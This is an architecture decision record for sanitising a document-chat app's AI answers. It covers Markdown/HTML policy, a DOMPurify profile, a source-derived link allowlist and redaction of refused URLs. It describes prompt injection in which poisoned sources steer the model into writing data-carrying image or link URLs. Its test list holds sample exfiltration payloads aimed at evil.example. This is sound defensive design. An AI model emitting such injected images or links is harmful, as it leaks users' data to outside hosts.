# ADR 0084: Sanitised answer rendering with a link allowlist

- **Status:** Accepted
- **Date:** 2026-10-21
- **Decided by:** Product owner and architect
- **Specified in:** 10-web-client.md, 82-security.md, 84-testing.md
- **Related ADRs:** 0004, 0063, 0064, 0083, 0085, 0087, 0090, 0092

## Context

- The product owner requires answers to be sanitised with DOMPurify. Answers render as Markdown with GitHub-flavoured extensions and raw HTML disabled, never load images (image syntax shows as its alt text), and turn a URL into a link only when it is `https:` and appears verbatim in a source used for that answer, opened with `rel="noopener noreferrer"`. The model has no tools; its only output is text.
- Documents are written by other people, so a poisoned source can steer the model into writing Markdown images or links whose URLs carry data out. The client never receives source text, so it can't check "verbatim in a source" itself: the API sends `allowedLinks` with the `citations` event and stores them on the turn, every distinct `https` URL found verbatim in the `SOURCE` blocks actually sent, at most 50 entries of at most 2,048 characters (ADR 0064). Only the API mints the citation tokens `⟦n⟧`, so no other bracketed text can become a citation.
- Vendor facts (checked 2026-10-14): `react-markdown` 10.1.0 renders React elements and never produces an HTML string, so a DOMPurify step would have nothing to sanitise; `remark-gfm` 4.0.1 turns bare URLs and `www.` text into links (autolink literals), so the link rule must run on every link in the renderer, not only on explicit Markdown links; DOMPurify 3.4.17's default profile allows CSS, data attributes and many URL schemes (`http`, `ftp`, `tel`, `mailto` and others), so an answer needs an explicit profile.

## Decision

1. **Pipeline.** `renderAnswer(text, context)` in `src/chat/render/pipeline.ts`, with `context` = `{ citations, allowedLinks }` (each absent until the turn has them), runs exactly: `unified().use(remarkParse).use(remarkGfm, { singleTilde: false }).use(remarkDocchatPolicy, context).use(remarkRehype).use(rehypeDocchatPolicy, context).use(rehypeStringify)`, then `processSync(text)` (`remark-rehype` and `rehype-stringify` keep `allowDangerousHtml: false`); then `sanitizeAnswerHtml(html, context)`; then `AnswerBody` inserts the result.
2. **Markdown rules** (`remarkDocchatPolicy`, in order): every `html` node becomes a `text` node with the same characters, so raw HTML shows as literal text; every `image` and `imageReference` becomes a `text` node holding its alt text (nothing when empty), so images are never loaded; `footnoteReference` becomes `[^<label>]` and `footnoteDefinition` its own paragraphs, the first prefixed `[^<label>]: `, so no in-page anchors or generated IDs exist; a task-list item loses its checkbox and its first paragraph starts with `☑ ` (U+2611) or `☐ ` (U+2610), so no `<input>` exists; heading depth `d` becomes `min(d + 2, 6)`, so answer headings never compete with the page's `h1` and `h2`; in `code` and `inlineCode` each `⟦n⟧` becomes `[n]`; in `text` nodes citation tokens become citation nodes (item 5).
3. **HTML rules** (`rehypeDocchatPolicy`, in order): the redaction of refused URLs (item 11) in every text node; the link policy (item 4) on every `a`; every `table` wrapped in a `div` with `role="region"`, `tabindex="0"` and `aria-label="Table <k>"` (k counts the answer's tables from 1), so a wide table scrolls inside its own focusable region; `className` and `id` removed from every element. Kept extensions: tables, strikethrough, autolink literals (under the link policy) and task lists (as glyphs).
4. **Link policy.** A link exists only when all of these hold: the turn's `allowedLinks` has arrived (live: in the `citations` event; stored: in the turn view); the URL parses with `new URL()`, its protocol is `https:`, it has no user name or password and at most 2,048 characters; and its normalised form (`URL.href`) equals the normalised form of an `allowedLinks` entry (entries are normalised the same way on arrival; an entry that doesn't parse is dropped). An allowed link gets `href` = the normalised URL, `target="_blank"`, `rel="noopener noreferrer"` and an `aria-label` of the link text plus a note that it opens in a new tab. Every other link (inline, reference, autolink literals including `www.` ones, which become `http:`, `mailto:` and every other scheme) is replaced by its text, so the words stay and nothing is clickable or fetched. That text is the link text after the redaction of item 11, so a refused bare URL, whose link text is the URL, renders as `[link removed]` and never as its URL. Before `citations` arrives, no link exists.
5. **Citation tokens.** In `text` nodes outside links, matches of `/⟦([1-9][0-9]?)⟧/g` render as `<sup>[n]</sup>` while the citation list is unknown; as `<sup><button type="button" data-citation="n" aria-label="Source n: <title>">n</button></sup>` once it is known and lists `n`; and as nothing once it is known and doesn't list `n`. Inside a link's text a token becomes plain `[n]`, because a button can't sit inside a link. The plugin emits them through mdast `data.hName`, `data.hProperties` and `data.hChildren`. One click listener on the answer container (`event.target.closest('button[data-citation]')`) opens the citation viewer (ADR 0087); native buttons give Enter and Space activation.
6. **DOMPurify profile.** `src/chat/render/sanitize.ts` creates one instance with `DOMPurify(window)`, registers its hooks once, and passes the answer's allowlist through a module variable set before and cleared after each synchronous `sanitize` call. Configuration: `ALLOWED_TAGS` `p`, `br`, `hr`, `h3` to `h6`, `strong`, `em`, `del`, `code`, `pre`, `blockquote`, `ul`, `ol`, `li`, `table`, `thead`, `tbody`, `tr`, `th`, `td`, `a`, `sup`, `button`, `div`; `ALLOWED_ATTR` `href`, `target`, `rel`, `aria-label`, `type`, `data-citation`, `align`, `start`, `role`, `tabindex`; `ALLOWED_URI_REGEXP` `/^https:\/\//i`; `ALLOW_DATA_ATTR`, `ALLOW_ARIA_ATTR`, `ALLOW_UNKNOWN_PROTOCOLS`, `ALLOW_SELF_CLOSE_IN_ATTR`, `SAFE_FOR_TEMPLATES`, `WHOLE_DOCUMENT`, `RETURN_DOM`, `RETURN_DOM_FRAGMENT` and `RETURN_TRUSTED_TYPE` false; `KEEP_CONTENT`, `SAFE_FOR_XML`, `SANITIZE_DOM` and `SANITIZE_NAMED_PROPS` true; `FORBID_TAGS` `style`, `img`, `svg`, `math`, `form`, `input`, `textarea`, `select`, `option`, `iframe`, `frame`, `object`, `embed`, `video`, `audio`, `source`, `track`, `picture`, `link`, `meta`, `base`, `script`, `template`, `noscript`; `FORBID_ATTR` `style`, `id`, `name`, `class`, `src`, `srcset`, `action`, `formaction`, `xlink:href`. Hooks: `uponSanitizeAttribute` keeps an attribute only where it belongs (on `a`: `href`, `target`, `rel`, `aria-label`; on `button`: `type` with value `button`, `data-citation` matching `^[1-9][0-9]?$`, `aria-label`; on `th` and `td`: `align` of `left`, `center` or `right`; on `ol`: `start` matching `^[0-9]{1,6}$`; on `div`: `role` `region`, `tabindex` `0`, `aria-label`; elsewhere nothing); `afterSanitizeAttributes` removes `href`, `target` and `rel` from an `a` whose `href` is absent or whose normalised value isn't in the allowlist, otherwise sets `rel="noopener noreferrer"` and `target="_blank"`, and sets `type="button"` on every `button`.
7. **One insertion point.** `src/chat/render/AnswerBody.tsx` is the only component that inserts HTML: a `div` styled with `makeStyles` (rules for its nested elements, `button[data-citation]` and `a[target="_blank"]::after { content: " ↗" / ""; }` included) whose `dangerouslySetInnerHTML` is the sanitised string, memoised on the text, the citation list and the allowlist. ESLint enforces it: `no-restricted-syntax` bans `dangerouslySetInnerHTML` everywhere else, assignments to `innerHTML` or `outerHTML`, and `insertAdjacentHTML`, `document.write` and `document.writeln`; `no-restricted-imports` confines `dompurify`, `unified`, `remark-*` and `rehype-*` to `src/chat/render/`.
8. **Cadence and fallbacks.** While a turn streams, the pipeline runs at most once per 100 ms (trailing edge), and at once on `citations`, on the terminal outcome and on stop. An answer longer than 200,000 characters renders as plain text in a `pre-wrap` block without the pipeline. If the pipeline throws, the text renders as plain text with each `⟦n⟧` as `[n]`, and no HTML is inserted. Both fallbacks pass their text through `redactRefusedUrls` (item 11) first.
9. **Everything else is text.** Questions, session titles, project names, descriptions, instructions, example questions, follow-ups, memory facts, document and file names, user names, e-mail addresses and error text from the API render only as React text nodes, never as Markdown or HTML.
10. **Copy answer.** The copy action writes only `text/plain` through `navigator.clipboard.writeText`, never HTML and never the model's raw Markdown: plain text built from the answer's rendered, policy-applied tree (the pipeline of decision 1 up to the policy plugins, with the turn's citations and `allowedLinks`). The tree is the one whose text item 11 has redacted. An allowed link is written as `<link text> (<URL>)`, and a space follows when the next copied character isn't white space; a refused link as its link text after the redaction, so a refused bare URL or `www.` address copies as `[link removed]`; prose, alt text, raw HTML shown as text, a code block and inline code as their text after the redaction, so a refused URL in them copies as `[link removed]`; an image never (the answer renders none); and a citation as `[n]`. A pasted answer therefore carries no link the page refused, and no URL with a scheme and `//`, `www.` address or protocol-relative address that the page refused. When the tree can't be built, nothing is written and the copy fails visibly. On success the icon shows a check mark for 2,000 ms and the status region announces the copy.
11. **Refused URLs in text.** `redactRefusedUrls(text, allowedLinks)` in `src/chat/render/redact.ts` replaces every refused URL in a text by `[link removed]` (`10-web-client.md` section 9.8). A candidate is a URL of any scheme written with `//`, a `www.` address in any letter case or a protocol-relative `//host.example/…` address, found with Cf code points left out so that no invisible character splits one; its trailing punctuation is trimmed by the GFM extended-autolink rules and stays in the text; it is kept only when it is an allowed link by item 4, so a `www.` or protocol-relative candidate is always refused. The first step of `rehypeDocchatPolicy` applies it to every text node of the answer (prose, link text, inline code, code blocks, image alt text and raw HTML shown as text), matching across the text nodes of one block so that markup can't split a URL, with a citation counted as a space; the fallbacks of item 8 and the announced text pass through it too. Email addresses stay. The visible answer therefore holds no refused candidate, so neither selecting its text nor Copy answer carries one out. What remains is a domain written without a scheme, `www.` or `//` (`example.net/abc`): DocChat never links or loads it, and it reaches a fetch only when the reader copies the answer and pastes it into an application that turns bare domains into links and fetches previews.

## Alternatives considered

- **A renderer that produces React elements (`react-markdown`).** Rejected: it never yields a string, so the required DOMPurify step would sanitise nothing, and its default URL transform keeps `http`, `mailto` and other schemes.
- **DOMPurify alone, with no Markdown policy.** Rejected: DOMPurify can't know which URLs the sources held, and autolinks need the rule inside the renderer; the profile's hooks repeat the link rule, so a defect in one stage can't produce a working link.
- **Checking links against the source text in the browser.** Rejected: the browser never receives source text; the API's `allowedLinks` is the evidence.
- **Exact string matching without normalisation.** Rejected: the model may change a host's case or drop a default port while naming the same resource; normalising both sides with the same URL parser compares what the browser would actually fetch.
- **Images from allowlisted URLs.** Rejected: answers never load images, because an image fetch is a beacon.
- **Links before `citations` arrives.** Rejected: there is no allowlist until then.

## Consequences

- An injected image, link, form, script, style or frame renders as text; nothing in an answer fetches or navigates except a click on an allowlisted `https` link, which opens a new tab with no referrer and no opener.
- Answers carry no raw HTML or images, footnotes and task lists flatten, and headings are demoted; a correct URL that no source contained shows as `[link removed]`, in prose and in code alike, so an answer that quotes a URL no source held loses it. A domain written without a scheme, `www.` or `//` stays as text, which an application that turns bare domains into links can fetch after the reader pastes the answer there (decision 11).
- Obligations (84-testing.md): unit tests that an answer containing `![x](https://evil.example/p.png)`, raw `<img src=https://evil.example/p.png>`, `<script>`, `[a](https://evil.example/?d=secret)`, a bare `https://evil.example/x`, `www.evil.example`, `<https://evil.example>`, a reference link, `javascript:` and `data:` links, an `<iframe>`, a footnote and a task list renders HTML with no `img`, `script`, `iframe`, `input`, `style` or `src` and exactly one `a`, for the allowlisted `https://docs.example/a`, with `rel="noopener noreferrer"` and `target="_blank"`; that no link exists before `citations`, that a URL differing only after normalisation matches and one with a user name doesn't; that tokens `⟦1⟧` and `⟦7⟧` with citations 1 and 2 render one button and nothing; that the sanitiser alone strips a non-allowlisted `<a onclick=…>`, any `style` attribute and any `button` without `type="button"`; that the copy action writes plain text with `[n]`, a refused link as its text, a refused bare URL with a query as `[link removed]`, an allowed link as `<link text> (<URL>)` and no Markdown image; that the redaction of decision 11 replaces a refused bare URL with a query, a URL inside a code block, inside image alt text and inside raw `<img>` text, a `www.` form, a protocol-relative form and a URL split by markup or a zero-width space with `[link removed]`, keeps trailing punctuation after the marker, and keeps an allowed URL in prose and in code; the browser exfiltration spec `tests/e2e/specs/web/exfiltration.spec.ts`, in which rendering that answer makes no request to any origin other than the app, the stub API and the stub Entra ID, shows `[link removed]` for every refused URL, and clicking that marker navigates nowhere; at least 95% branch coverage in `src/chat/render/`.
